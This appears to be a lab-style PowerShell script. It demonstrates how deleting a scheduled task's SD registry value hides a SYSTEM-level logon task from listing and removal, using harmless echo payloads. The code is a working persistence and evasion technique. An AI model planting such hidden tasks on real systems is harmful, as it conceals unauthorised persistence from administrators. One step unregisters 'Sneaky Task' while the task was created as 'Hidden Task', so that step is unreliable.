# 01 - Create Schedule Task

$taskName = "Normal Task"
$trigger = New-ScheduledTaskTrigger -AtLogon
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c echo "Normal task msg" > C:\Users\Public\normal.txt'
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal


# 02 - Create Sneaky Schedule Task

$taskName = "Hidden Task"
$trigger = New-ScheduledTaskTrigger -AtLogon
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c echo "Hidden execution" > C:\Users\Public\pwned.txt'
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal

# 03 - Search for Schedule Tasks

Get-ScheduledTask -TaskPath \

# 04 - Remove SD key - requires powershell running as NT AUTHORITY\SYSTEM

Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Hidden Task" -Name "SD" -Force

# 05 - Search for Schedule Tasks

Get-ScheduledTask -TaskPath \

# 06 - Try to remove schedule tasks

Unregister-ScheduledTask -TaskName "Normal Task" -Confirm:$false

Unregister-ScheduledTask -TaskName "Sneaky Task" -Confirm:$false


